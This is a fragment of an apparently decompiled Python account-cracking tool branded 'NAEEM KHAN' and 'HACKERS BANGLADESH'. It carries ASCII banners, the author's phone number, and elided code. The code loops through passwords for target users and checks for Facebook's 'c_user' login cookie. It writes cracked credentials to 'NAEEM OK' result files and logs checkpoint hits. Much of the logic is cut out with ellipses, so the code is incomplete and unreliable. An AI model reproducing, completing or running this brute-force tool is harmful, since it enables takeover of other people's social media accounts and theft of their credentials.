# Decoder By NAEEM KHAN 👑
# Decode file /- NA Cobra PYC 3.11
# DECODE FILE VERSION - V.3.1.1
# WHATSAPP - 01860350021
import os
import time
os.system("clear")
print("  ==> \033[1;32mTHIS TOOLS DECODE BY (Naeem Khan ")
time.sleep(5)
...
\033[1;92m _  _    __    ____  ____  __  __    _  _  ___   __  __ 
\033[1;92m( \( )  /__\  ( ___)( ___)(  \/  )  ( \( )(__ \ (  \/  )
 \033[1;92m)  (  /(__)\  )__)  )__)  )    (    )  (  / _/  )    ( 
\033[1;92m(_)\_)(__)(__)(____)(____)(_/\/\_)  (_)\_)(____)(_/\/\_)

\033[1;92m    | [\033[1;31;1m©\033[1;92m]  [\033[1;31;1m©\033[1;92m] |​
 \033[1;92m   |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+]
\033[1;92m╔══o00════════00o═════════════════════════╗
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mAuthor    :  \033[1;92m NAEEM KHAN_           \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  :  \033[1;92m 01860350021         \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mGitHub    : \033[1;92m  naeemn2m_           \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mGorup Fb  :   \033[1;92mMr Hadaram\033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m█
\033[1;92m╚═════════════════════════════════════════╝""")
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCracking By NAEEM Usercrack...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
        ...
        if cek_cp =="":
            ...
            for memek in cp:
                ...
                titid  = kontol.split(' • ')
                print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[NAEEM-CP] ", "")}{N}')
                try:
...
class __chigoue__:
    ...
    def __metode__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;92m[NAEEM]","\x1b[1;92m[NAEEM]","\x1b[1;92m[NAEEM]","\x1b[1;92m[NAEEM]","\x1b[1;92m[NAEEM]","\x1b[1;92m[NAEEM]","\x1b[1;92m[NAEEM]"])
        ...
        try:
            for pw in pasw:
                ...
                if "c_user" in session.cookies.get_dict():
                    ...
                    open('results/NAEEM OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                    ...
                    try:
                        ...
                        wrt = '[NAEEM CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
